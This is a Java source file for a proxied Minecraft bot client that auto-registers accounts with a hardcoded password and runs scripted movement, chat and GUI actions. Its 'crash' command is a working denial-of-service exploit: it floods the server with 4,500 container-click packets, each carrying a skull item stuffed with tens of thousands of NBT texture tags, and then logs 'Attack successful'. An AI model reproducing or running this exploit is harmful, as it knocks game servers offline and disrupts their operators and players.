package dev.xqedii;

import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.Position;
import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundLoginPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.player.ClientboundPlayerPositionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundAcceptTeleportationPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.*;
import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.DisconnectedEvent;
import com.github.steveice10.packetlib.event.session.SessionAdapter;
import com.github.steveice10.packetlib.packet.Packet;
import com.github.steveice10.packetlib.tcp.TcpClientSession;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
import com.github.steveice10.mc.protocol.data.game.inventory.ClickItemAction;
import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
import com.github.steveice10.opennbt.tag.builtin.StringTag;
import com.github.steveice10.opennbt.tag.builtin.ListTag;

import java.net.InetSocketAddress;
import java.util.concurrent.*;
import java.util.UUID;
import java.util.HashMap;
import java.util.Arrays;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class Bot extends Thread {

    MinecraftProtocol protocol = null;

    private int botId;
    private String nickname;
    private ProxyInfo proxy;
    private InetSocketAddress address;
    private Session client;
    private boolean hasMainListener;
    private boolean LimboConnected = false;
    private double lastX, lastY, lastZ = -1;

    private ScheduledExecutorService botHeadroll;
    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    private boolean connected;

    public Bot(int botId, String nickname, InetSocketAddress address, ProxyInfo proxy) {
        this.botId = botId;
        this.nickname = nickname;
        this.address = address;
        this.proxy = proxy;

        Log.info("Creating bot", nickname, " [#" + botId + "]");
        protocol = new MinecraftProtocol(nickname);
        client = new TcpClientSession(address.getHostString(), address.getPort(), protocol, proxy);
    }

    @Override
    public void run() {

        if (!Main.isMinimal()) {
            client.addListener(new SessionAdapter() {

                @Override
                public void packetReceived(Session session, Packet packet) {

                    if (packet instanceof ClientboundLoginPacket) {
                        connected = true;
                        if (!LimboConnected) {
                            LimboConnected = true;
                            Log.info(nickname + " Connected to server! [#" + botId + "]");

                            ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
                            scheduler.schedule(() -> {
                                Log.info(nickname + " Connected! [#" + botId + "]");
                                executeScriptFromFile("files/actions.txt");
                            }, 1, TimeUnit.SECONDS);
                        }
                    }
                    else if (packet instanceof ClientboundKeepAlivePacket) {
                        ClientboundKeepAlivePacket keepAlive = (ClientboundKeepAlivePacket) packet;
                        long id = keepAlive.getPingId();
                        long now = System.currentTimeMillis();
                        client.send(new ServerboundKeepAlivePacket(id)); // Kinda bugged
                    } else if (packet instanceof ClientboundPlayerPositionPacket) {
                        ClientboundPlayerPositionPacket p = (ClientboundPlayerPositionPacket) packet;

                        lastX = p.getX();
                        lastY = p.getY();
                        lastZ = p.getZ();

                        client.send(new ServerboundAcceptTeleportationPacket(p.getTeleportId()));
                    }
                }

                @Override
                public void disconnected(DisconnectedEvent event) {
                    connected = false;
                    Log.info();
                    Log.info(nickname + " disconnected");
                    Log.info(" -> " + event.getReason());
                    if(event.getCause() != null) {
                        event.getCause().printStackTrace();
                    }
                    Log.info();
                    Main.removeBot(Bot.this);
                    Thread.currentThread().interrupt();
                }
            });
        }
        client.connect();
        if (client.isConnected()) {
            client.disconnect("Bot stopped.");
        }
    }

    public int getBotId() {
        return botId;
    }

    public void startHeadroll() {
        if (botHeadroll != null && !botHeadroll.isShutdown()) {
            botHeadroll.shutdownNow();
        }
        botHeadroll = Executors.newSingleThreadScheduledExecutor();

        Log.info("Starting life loop for bot #" + botId);

        botHeadroll.scheduleAtFixedRate(() -> {
            if (!client.isConnected()) {
                botHeadroll.shutdown();
                return;
            }

            float newYaw = ThreadLocalRandom.current().nextFloat() * 360.0f - 180.0f;
            float newPitch = ThreadLocalRandom.current().nextFloat() * 180.0f - 90.0f;
            client.send(new ServerboundMovePlayerPosRotPacket(true, lastX, lastY, lastZ, newYaw, newPitch));

        }, 200, 200, TimeUnit.MILLISECONDS);
    }

    public void stopHeadroll() {
        if (botHeadroll != null && !botHeadroll.isShutdown()) {
            botHeadroll.shutdownNow();
        }
    }

    public void selectHotbarSlot(int slot) {
        if (slot < 0 || slot > 8) return;
        client.send(new ServerboundSetCarriedItemPacket(slot));
    }
    public void rightClickWithItem() {
        if (!connected) return;
        client.send(new ServerboundUseItemPacket(Hand.MAIN_HAND));
    }
    public void clickSlot(int slot, int container) {
        if (!connected) return;

        try {
            client.send(new ServerboundContainerClickPacket(
                    container, 0, slot,
                    ContainerActionType.CLICK_ITEM,
                    ClickItemAction.LEFT_CLICK,
                    null,
                    new Int2ObjectOpenHashMap<>()
            ));
        } catch (Exception ignored) {}
    }

    public void sendChat(String text) {
        client.send(new ServerboundChatPacket(text));
    }

    public void changeSector(int channel, String type, int container) {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

        scheduler.schedule(() -> {
            if (type.equals("sector")) {
                sendChat("/ch");
            } else {
                sendChat("/afk");
            }
            scheduler.schedule(() -> {
                Log.info("Clicked in GUI");
                clickSlot(channel-1, container);
                scheduler.schedule(() -> {
                    for (int i = 0; i < 3; i++) { // 0.5 block down (3 times)
                        long delay = 500 * (i + 9);
                        scheduler.schedule(() -> {move(0, -0.5, 0); }, delay, TimeUnit.MILLISECONDS);
                    }
                }, 2, TimeUnit.SECONDS); // Sector move time
            }, 1, TimeUnit.SECONDS);
        }, 1, TimeUnit.SECONDS);
    }

    public void dropHotbarItems() {
        Log.info("Starting to drop hotbar items for " + nickname);
        dropItemFromSlot(0);
    }

    private void dropItemFromSlot(int slot) {
        if (slot > 8) {
            Log.info("Finished dropping items for " + nickname);
            return;
        }

        client.send(new ServerboundSetCarriedItemPacket(slot));

        scheduler.schedule(() -> {
            client.send(new ServerboundPlayerActionPacket(
                    PlayerAction.DROP_ITEM_STACK,
                    new Position(0, 0, 0),
                    Direction.DOWN
            ));

            scheduler.schedule(() -> {
                dropItemFromSlot(slot + 1);
            }, 50, TimeUnit.MILLISECONDS);

        }, 50, TimeUnit.MILLISECONDS);
    }

    public String getNickname() {
        return nickname;
    }

    public void registerMainListener() {
        hasMainListener = true;
        if (Main.isMinimal()) return;
        client.addListener(new MainListener(nickname));
    }

    public boolean hasMainListener() {
        return hasMainListener;
    }

    public void fallDown()
    {
        if (connected && lastY > 0) {
            move(0, -0.5, 0);
        }
    }

    public void move(double x, double y, double z)
    {
        lastX += x;
        lastY += y;
        lastZ += z;
        moveTo(lastX, lastY, lastZ);
    }
    public void moveTo(double x, double y, double z)
    {
        client.send(new ServerboundMovePlayerPosPacket(true, x, y, z));
    }

    public void moveSmoothlyTo(double targetX, double targetY, double targetZ) {
        double startX = 62;
        double startY = 132;
        double startZ = 201;

        double dx = targetX - startX;
        double dy = targetY - startY;
        double dz = targetZ - startZ;

        double distance = Math.sqrt(dx * dx + dy * dy + dz * dz);
        double speed = 4.317;
        double totalTimeSeconds = distance / speed;

        int rawSteps = (int) (totalTimeSeconds * 20);
        int steps = Math.max(1, rawSteps);

        double stepX = dx / steps;
        double stepY = dy / steps;
        double stepZ = dz / steps;

        new Thread(() -> {
            for (int i = 1; i <= steps; i++) {
                double nextX = startX + stepX * i;
                double nextY = startY + stepY * i;
                double nextZ = startZ + stepZ * i;

                client.send(new ServerboundMovePlayerPosPacket(true, nextX, nextY, nextZ));

                try {
                    scheduler.schedule(() -> {}, 50, TimeUnit.MILLISECONDS).get();
                } catch (InterruptedException | ExecutionException e) {
                    break;
                }
            }
        }).start();
    }


    public void autoLogin() {
        sendChat("/login XqBots!@3");
    }
    public void autoRegister() {
        sendChat("/register XqBots!@3 XqBots!@3");
    }

    public void startSendingPackets() {
        int packets = 4500;
        int size = 39000;
        int length = 10;
        String type = "empty";

        Log.info("Starting crash with " + nickname);

        ItemStack itemStack = this.getSkullStack(size, length, type);

        for (int i = 0; i < packets; ++i) {
            ServerboundContainerClickPacket clickPacket = new ServerboundContainerClickPacket(
                    0,
                    0,
                    20,
                    ContainerActionType.CLICK_ITEM,
                    ClickItemAction.LEFT_CLICK,
                    itemStack,
                    new HashMap<Integer, ItemStack>()
            );

            client.send(clickPacket);
        }

        Log.info("Attack successful, finished sending packets!");
    }


    public ItemStack getSkullStack(int size, int length, String type) {
        CompoundTag skullTag = new CompoundTag("SkullTag");

        CompoundTag skullOwner = new CompoundTag("SkullOwner");
        CompoundTag properties = this.getSkullCompound(size, length, type);

        skullOwner.put(properties);
        skullOwner.put(new StringTag("Name", String.valueOf(ThreadLocalRandom.current().nextInt())));
        skullOwner.put(new StringTag("Id", UUID.randomUUID().toString()));

        skullTag.put(skullOwner);

        return new ItemStack(397, 1, skullTag);
    }


    private CompoundTag getSkullCompound(int size, int length, String propType) {
        CompoundTag properties = new CompoundTag("Properties");
        ListTag list = new ListTag("textures", CompoundTag.class);

        if (propType.equalsIgnoreCase("full")) {
            String value = generateRandomString(length);
            for (int i = 0; i < size; i++) {
                CompoundTag tag = new CompoundTag("");
                tag.put(new StringTag("Value", value));
                tag.put(new StringTag("Signature", value));
                list.add(tag);
            }
        } else if (propType.equalsIgnoreCase("empty")) {
            for (int i = 0; i < size; i++) {
                list.add(new CompoundTag(""));
            }
        }

        properties.put(list);
        return properties;
    }


    private String generateRandomString(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) ('a' + ThreadLocalRandom.current().nextInt(26)));
        }
        return sb.toString();
    }

    public void executeScriptFromFile(String resourcePath) {
        new Thread(() -> {
            Log.info("Starting to execute script from resource: " + resourcePath, nickname);

            ClassLoader classLoader = Bot.class.getClassLoader();
            InputStream inputStream = classLoader.getResourceAsStream(resourcePath);

            if (inputStream == null) {
                Log.error("Resource not found: " + resourcePath);
                return;
            }

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                List<String> lines = new ArrayList<>();
                reader.lines().forEach(lines::add);

                for (int i = 0; i < lines.size(); i++) {
                    String line = lines.get(i);

                    if (line.contains("#")) {
                        line = line.split("#", 2)[0];
                    }
                    String trimmedLine = line.trim();

                    if (trimmedLine.isEmpty()) {
                        continue;
                    }

                    if (trimmedLine.startsWith("[loop") && trimmedLine.endsWith("]:")) {
                        String[] parts = trimmedLine.substring(1, trimmedLine.length() - 2).split(" ");
                        if (parts.length < 2) {
                            Log.error("Invalid loop syntax: " + trimmedLine);
                            continue;
                        }
                        int loopCount;
                        try {
                            loopCount = Integer.parseInt(parts[1]);
                        } catch (NumberFormatException e) {
                            Log.error("Invalid loop count in: " + trimmedLine);
                            continue;
                        }

                        List<String> loopBody = new ArrayList<>();
                        int baseIndentation = getIndentation(line);
                        int bodyIndentation = -1;
                        i++;

                        while (i < lines.size()) {
                            String loopLine = lines.get(i);
                            int currentIndentation = getIndentation(loopLine);
                            if (bodyIndentation == -1) {
                                if (currentIndentation > baseIndentation && !loopLine.trim().isEmpty()) {
                                    bodyIndentation = currentIndentation;
                                } else {
                                    i--;
                                    break;
                                }
                            }
                            if (currentIndentation >= bodyIndentation) {
                                loopBody.add(loopLine);
                                i++;
                            } else {
                                i--;
                                break;
                            }
                        }
                        Log.info("Executing loop " + loopCount + " times...", nickname);
                        for (int j = 0; j < loopCount; j++) {
                            Log.info("Loop iteration " + (j + 1) + "/" + loopCount, nickname);
                            for (String commandInLoop : loopBody) {
                                processCommand(commandInLoop);
                            }
                        }
                        Log.info("Loop finished.", nickname);

                    } else {
                        processCommand(line);
                    }
                }
                Log.info("Script finished successfully!", nickname);
            } catch (IOException e) {
                Log.info("Could not read script resource: " + resourcePath, e.getMessage());
            } catch (InterruptedException e) {
                Log.info("Script execution was interrupted.", nickname);
                Thread.currentThread().interrupt();
            }
        }).start();
    }
    private void processCommand(String rawLine) throws InterruptedException {
        if (rawLine == null) return;

        String line = rawLine;
        if (line.contains("#")) {
            line = line.split("#", 2)[0];
        }
        line = line.trim();

        if (!line.startsWith("[") || !line.endsWith("]")) {
            return;
        }

        String commandStr = line.substring(1, line.length() - 1);
        String[] parts = commandStr.split(" ");
        String command = parts[0].toLowerCase();

        Log.info("Executing command: [" + commandStr + "]", nickname);

        try {
            switch (command) {
                case "wait":
                    if (parts.length > 1) Thread.sleep(Integer.parseInt(parts[1]));
                    break;
                case "goto":
                    if (parts.length > 3) moveSmoothlyTo(Double.parseDouble(parts[1]), Double.parseDouble(parts[2]), Double.parseDouble(parts[3]));
                    break;
                case "move":
                    if (parts.length > 3) move(Double.parseDouble(parts[1]), Double.parseDouble(parts[2]), Double.parseDouble(parts[3]));
                    break;
                case "slot":
                    if (parts.length > 1) selectHotbarSlot(Integer.parseInt(parts[1]));
                    break;
                case "afksector":
                case "sector":
                    if (parts.length < 2) {
                        Log.info("Usage: [sector <number|auto|autoN>]", nickname);
                        break;
                    }
                    String sectorArg = parts[1].toLowerCase();

                    if (sectorArg.equals("auto")) {
                        Log.info("Changing sector automatically to bot's ID: " + this.botId, nickname);
                        changeSector(this.botId, command, 0);

                    } else if (sectorArg.startsWith("auto")) {
                        try {
                            String numberPart = sectorArg.substring(4);
                            int groupSize = Integer.parseInt(numberPart);

                            if (groupSize <= 0) {
                                Log.info("Group size for auto-sector must be a positive number.", nickname);
                                break;
                            }
                            int targetSector = ((this.botId - 1) / groupSize) + 1;
                            Log.info("Grouping by " + groupSize + ". Bot #" + this.botId + " is going to sector " + targetSector, nickname);
                            changeSector(targetSector, command, 0);

                        } catch (NumberFormatException | StringIndexOutOfBoundsException e) {
                            Log.info("Invalid auto-sector format. Use 'auto' or 'auto<number>', e.g., '[sector auto3]'.", nickname);
                        }
                    } else {
                        try {
                            int sectorNumber = Integer.parseInt(sectorArg);
                            changeSector(sectorNumber, command, 0);
                        } catch (NumberFormatException e) {
                            Log.info("Invalid sector argument: '" + sectorArg + "'. Must be a number, 'auto', or 'auto<N>'.", nickname);
                        }
                    }
                    break;
                case "right":
                    rightClickWithItem();
                    break;
                case "login":
                    autoLogin();
                    break;
                case "register":
                    autoRegister();
                    break;
                case "crash":
                    startSendingPackets();
                    break;
                case "gui":
                    if (parts.length > 2) clickSlot(Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
                    break;
                case "chat":
                    if (parts.length > 1) sendChat(String.join(" ", Arrays.copyOfRange(parts, 1, parts.length)));
                    break;
                default:
                    Log.error("Unknown command in script: " + command);
                    break;
            }
        } catch (NumberFormatException e) {
            Log.error("Invalid number in command: " + commandStr);
        }
    }

    private int getIndentation(String line) {
        int indentation = 0;
        for (char c : line.toCharArray()) {
            if (c == ' ' || c == '\t') {
                indentation++;
            } else {
                break;
            }
        }
        return indentation;
    }
}